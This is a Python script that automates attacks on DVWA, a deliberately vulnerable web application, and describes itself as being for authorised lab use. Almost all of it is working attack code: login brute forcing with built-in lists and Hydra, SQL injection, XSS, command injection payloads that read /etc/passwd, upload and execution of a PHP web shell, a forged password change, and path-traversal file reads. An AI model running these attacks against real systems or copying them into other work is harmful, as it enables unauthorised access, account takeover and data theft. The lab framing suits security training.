#!/usr/bin/env python3
"""
DVWA Attack Automation Script

This script demonstrates how to automate the execution of all major pentesting attack types 
against DVWA for educational and authorized testing purposes only.

WARNING: Only use this script in a legal, controlled environment (e.g., your own DVWA lab).
Unauthorized use is illegal and unethical.
"""
import requests
from bs4 import BeautifulSoup
import time
import subprocess
import os
import tempfile
import re
import argparse
import sys

# Default settings
DEFAULT_URL = "http://localhost:8080"
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "password"

# Global session object
session = requests.Session()

def login(url, user, pwd):
    """Authenticate with DVWA"""
    login_url = f"{url}/login.php"
    print(f"[+] Attempting to login to {login_url} as {user}")
    
    r = session.get(login_url)
    if r.status_code == 404:
        print(f"[!] Login page not found at {login_url} (HTTP 404). Check URL and server status.")
        return False
        
    soup = BeautifulSoup(r.text, 'html.parser')
    user_token_tag = soup.find('input', {'name': 'user_token'})
    if not user_token_tag:
        print(f"[!] Could not find user_token on login page. Page content: {r.text[:500]}")
        user_token = ""
    else:
        user_token = user_token_tag['value']

    data = {
        'username': user,
        'password': pwd,
        'Login': 'Login',
        'user_token': user_token
    }
    
    try:
        resp = session.post(login_url, data=data)
        if 'Login failed' in resp.text or 'login.php' in resp.url:
             print(f"[-] Login failed for {user}")
             return False
        assert 'Logout' in resp.text, f"Login failed for user {user}!"
        print(f"[+] Logged in to DVWA as {user}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[!] RequestException during login for {user}: {e}")
        return False
    except AssertionError as e:
        print(f"[-] {e}")
        return False

def reconnaissance(url):
    """Perform basic reconnaissance"""
    print("\n[+] Performing HTTP header analysis...")
    r = session.get(url)
    for key, value in r.headers.items():
        print(f"    {key}: {value}")
    
    print("\n[+] Directory brute force (sample)...")
    for path in ['admin', 'phpmyadmin', 'test', 'backup', 'config', 'setup']:
        target_url = f"{url}/{path}"
        resp = session.get(target_url)
        print(f"    {target_url} => {resp.status_code}")

def brute_force(url, use_python=True):
    """Perform brute force attack using either Python or Hydra"""
    print("\n[+] Attempting brute force on login...")
    
    # List of user:password pairs to try
    usernames = ["admin", "user", "msfadmin", "root", "postgres", "dbadmin"]
    passwords = ["password", "admin", "123456", "newpass", "12345", "msfadmin"]
    
    login_url = f"{url}/login.php"
    
    if use_python:
        # Python-based brute force
        print("[i] Using Python-based brute force.")
        
        # Create a new session for brute force to avoid interfering with the main session
        bf_session = requests.Session()
        
        # Try all combinations
        for username in usernames:
            for password in passwords:
                print(f"[i] Trying: {username}:{password}")
                
                # Get a fresh token for each attempt
                try:
                    r_token = bf_session.get(login_url)
                    soup = BeautifulSoup(r_token.text, 'html.parser')
                    user_token = soup.find('input', {'name': 'user_token'})['value']
                except:
                    # If we can't get a token, try the last one we had
                    pass
                    
                data = {
                    'username': username,
                    'password': password,
                    'Login': 'Login',
                    'user_token': user_token
                }
                
                try:
                    resp = bf_session.post(login_url, data=data, allow_redirects=True)
                    
                    # Check if login was successful
                    if 'Logout' in resp.text and 'login.php' not in resp.url:
                        print(f"[+] SUCCESS! Valid credentials found: {username}:{password}")
                        return (username, password)
                    
                    # Avoid overwhelming the server
                    time.sleep(0.1)
                    
                except requests.exceptions.RequestException as e:
                    print(f"[!] Error during brute force attempt: {e}")
                    time.sleep(1)  # Longer pause after an error
        
        print("[-] Brute force completed. No valid credentials found.")
        return None
    else:
        # Check if Hydra is installed
        try:
            if os.name == 'nt':  # Windows
                result = subprocess.run(['where', 'hydra'], capture_output=True, text=True)
            else:  # Unix-like
                result = subprocess.run(['which', 'hydra'], capture_output=True, text=True)
            
            if result.returncode == 0 and result.stdout.strip():
                print(f"[i] Hydra is installed at: {result.stdout.strip()}")
            else:
                raise FileNotFoundError("Hydra not found in PATH")
        except:
            print("[!] Hydra is not installed. Please install Hydra to use this feature.")
            print("    Install with: 'sudo apt install hydra' on Debian/Ubuntu or equivalent.")
            print("[i] Falling back to Python-based brute force.")
            return brute_force(url, use_python=True)
        
        # Create a temp file with credentials
        cred_list = []
        for username in usernames:
            for password in passwords:
                cred_list.append(f"{username}:{password}")
        
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as tmp_creds_file:
            for cred in cred_list:
                tmp_creds_file.write(cred + '\n')
            tmp_creds_file_path = tmp_creds_file.name
        
        print(f"[i] Credentials list for Hydra written to: {tmp_creds_file_path}")
        
        # Get token for login form
        try:
            r_token = requests.get(login_url)
            soup = BeautifulSoup(r_token.text, 'html.parser')
            user_token = soup.find('input', {'name': 'user_token'})['value']
        except Exception as e:
            print(f"[!] Failed to retrieve user_token: {e}")
            return None
        
        # Parse the URL to get hostname and port
        from urllib.parse import urlparse
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname or 'localhost'
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        
        # Run Hydra with proper URL format
        hydra_command = [
            'hydra',
            '-C', tmp_creds_file_path,
            f"http-post-form://{hostname}:{port}/login.php:username=^USER^&password=^PASS^&Login=Login&user_token={user_token}:S=Logout:F=Login failed"
        ]
        
        print(f"[i] Executing Hydra: {' '.join(hydra_command)}")
        
        try:
            process = subprocess.run(hydra_command, capture_output=True, text=True, timeout=300)
            output = process.stdout
            print("[+] Hydra Output:")
            print(output)
            
            # Parse Hydra output for credentials
            match = re.search(r"login:\s*(\S+)\s*password:\s*(\S+)", output, re.IGNORECASE)
            
            if match and "1 valid password found" in output:
                found_user = match.group(1)
                found_password = match.group(2)
                print(f"[!] Brute force success with Hydra! User: {found_user}, Password: {found_password}")
                
                # Verify found credentials
                test_login = login(url, found_user, found_password)
                if test_login:
                    print(f"[+] Successfully verified Hydra credentials: {found_user}:{found_password}")
                    return (found_user, found_password)
                else:
                    print(f"[-] Could not verify Hydra credentials: {found_user}:{found_password}")
            else:
                print("[-] No valid credentials found by Hydra.")
        except Exception as e:
            print(f"[!] Error running Hydra: {e}")
        finally:
            # Clean up temp file
            if os.path.exists(tmp_creds_file_path):
                os.remove(tmp_creds_file_path)
                print(f"[i] Temporary credentials file removed.")
        
        return None

def sql_injection(url):
    """Test SQL injection vulnerability"""
    print("\n[+] Performing SQL Injection...")
    
    # Test various SQL injection payloads
    payloads = [
        "1' OR '1'='1",
        "1 OR 1=1",
        "' OR ''='",
        "1' OR '1'='1' --",
        "' UNION SELECT 1,2,3,4,5,6,7,8 --"
    ]
    
    for payload in payloads:
        sqli_url = f"{url}/vulnerabilities/sqli/?id={payload}&Submit=Submit"
        print(f"[i] Trying payload: {payload}")
        r = session.get(sqli_url)
        
        # Check for successful injection indicators
        if 'First name' in r.text and 'Surname' in r.text:
            print(f"[!] SQL Injection successful with payload: {payload}")
            return True
    
    print("[-] SQL Injection failed or not vulnerable.")
    return False

def xss(url):
    """Test Cross-Site Scripting vulnerability"""
    print("\n[+] Performing XSS attack...")
    
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "';alert('XSS');//",
        "<svg/onload=alert('XSS')>"
    ]
    
    for payload in payloads:
        xss_url = f"{url}/vulnerabilities/xss_r/?name={payload}&Submit=Submit"
        print(f"[i] Trying XSS payload: {payload}")
        r = session.get(xss_url)
        
        if payload in r.text:
            print(f"[!] XSS payload reflected: {payload}")
            return True
    
    print("[-] XSS attack failed or not vulnerable.")
    return False

def command_injection(url):
    """Test Command Injection vulnerability"""
    print("\n[+] Performing Command Injection...")
    
    payloads = [
        "127.0.0.1; cat /etc/passwd",
        "127.0.0.1 && cat /etc/passwd",
        "127.0.0.1 | cat /etc/passwd",
        "127.0.0.1 || cat /etc/passwd",
        "`cat /etc/passwd`"
    ]
    
    for payload in payloads:
        ci_url = f"{url}/vulnerabilities/exec/"
        data = {'ip': payload, 'Submit': 'Submit'}
        print(f"[i] Trying command: {payload}")
        r = session.post(ci_url, data=data)
        
        if 'root:x:' in r.text or 'www-data' in r.text:
            print(f"[!] Command Injection successful with: {payload}")
            return True
    
    print("[-] Command Injection failed or not vulnerable.")
    return False

def file_upload(url):
    """Test File Upload vulnerability"""
    print("\n[+] Attempting file upload...")
    
    upload_url = f"{url}/vulnerabilities/upload/"
    
    # Test different file types and bypasses
    test_files = [
        ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
        ('shell.php.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
        ('shell.php5', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
        ('shell.phtml', '<?php system($_GET["cmd"]); ?>', 'application/x-php')
    ]
    
    for filename, content, content_type in test_files:
        files = {'uploaded': (filename, content, content_type)}
        data = {'Upload': 'Upload'}
        
        print(f"[i] Trying to upload: {filename}")
        r = session.post(upload_url, files=files, data=data)
        
        if 'succesfully uploaded' in r.text.lower() or filename in r.text:
            print(f"[!] File upload successful with: {filename}")
            
            # Try to execute the uploaded shell
            shell_url = f"{url}/hackable/uploads/{filename}?cmd=id"
            r2 = session.get(shell_url)
            if r2.status_code == 200 and len(r2.text.strip()) > 0:
                print(f"[+] Shell execution successful! Output:")
                print(r2.text)
            return True
    
    print("[-] File upload failed or not vulnerable.")
    return False

def csrf(url):
    """Test Cross-Site Request Forgery vulnerability"""
    print("\n[+] Attempting CSRF attack (change password)...")
    
    # First get the CSRF page to check current state
    csrf_url = f"{url}/vulnerabilities/csrf/"
    r = session.get(csrf_url)
    
    new_password = 'hacked123'
    
    # Create data for changing password
    data = {
        'password_new': new_password,
        'password_conf': new_password,
        'Change': 'Change'
    }
    
    # Submit via GET (CSRF scenario)
    query_params = "&".join([f"{key}={value}" for key, value in data.items()])
    exploit_url = f"{csrf_url}?{query_params}"
    
    print(f"[i] Sending CSRF request to: {exploit_url}")
    resp = session.get(exploit_url)
    
    if 'Password Changed' in resp.text:
        print(f"[!] CSRF successful! Password changed to: {new_password}")
        return True
    else:
        print("[-] CSRF attack failed or not vulnerable.")
        return False

def lfi(url):
    """Test Local File Inclusion vulnerability"""
    print("\n[+] Attempting LFI (Local File Inclusion)...")
    
    # Test various LFI payloads
    payloads = [
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd",
        "....//....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
    ]
    
    for payload in payloads:
        lfi_url = f"{url}/vulnerabilities/fi/?page={payload}"
        print(f"[i] Trying LFI payload: {payload}")
        r = session.get(lfi_url)
        
        if 'root:x:' in r.text:
            print(f"[!] LFI successful with: {payload}")
            return True
    
    print("[-] LFI failed or not vulnerable.")
    return False

def logout(url):
    """Log out from DVWA"""
    print("\n[+] Logging out...")
    
    try:
        r_check = session.get(url + "/index.php")
        if "Logout" in r_check.text:
            session.get(f"{url}/logout.php")
            print("[+] Logged out successfully.")
            return True
        else:
            print("[i] Not logged in or session expired, skipping logout.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during logout: {e}")
        return False

def main():
    """Main function to run the attack automation"""
    parser = argparse.ArgumentParser(description="DVWA Attack Automation Script")
    parser.add_argument("--url", default=DEFAULT_URL, help=f"DVWA URL (default: {DEFAULT_URL})")
    parser.add_argument("--username", default=DEFAULT_USERNAME, help=f"Username (default: {DEFAULT_USERNAME})")
    parser.add_argument("--password", default=DEFAULT_PASSWORD, help=f"Password (default: {DEFAULT_PASSWORD})")
    parser.add_argument("--hydra", action="store_true", help="Use Hydra for brute force (default: Python)")
    parser.add_argument("--attacks", default="all", 
                        choices=["all", "recon", "brute", "sqli", "xss", "cmdi", "upload", "csrf", "lfi"],
                        help="Specific attack to run (default: all)")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print(f"DVWA Attack Automation Script - Target: {args.url}")
    print("=" * 60)
    print("[!] WARNING: Only use against systems you own or have permission to test.")
    print("=" * 60)
    
    # Login first
    if not login(args.url, args.username, args.password):
        print("[!] Initial login failed. Exiting.")
        sys.exit(1)
    
    # Run selected attacks
    if args.attacks in ["all", "recon"]:
        reconnaissance(args.url)
    
    if args.attacks in ["all", "brute"]:
        brute_force(args.url, not args.hydra)  # Use Python by default
    
    # Re-login to ensure session is valid for other attacks
    if args.attacks == "all":
        print("[i] Re-establishing session...")
        login(args.url, args.username, args.password)
    
    if args.attacks in ["all", "sqli"]:
        sql_injection(args.url)
    
    if args.attacks in ["all", "xss"]:
        xss(args.url)
    
    if args.attacks in ["all", "cmdi"]:
        command_injection(args.url)
    
    if args.attacks in ["all", "upload"]:
        file_upload(args.url)
    
    if args.attacks in ["all", "csrf"]:
        csrf(args.url)
    
    if args.attacks in ["all", "lfi"]:
        lfi(args.url)
    
    # Always logout at the end
    logout(args.url)
    
    print("\n" + "=" * 60)
    print("[+] All tests completed.")
    print("=" * 60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Script interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)
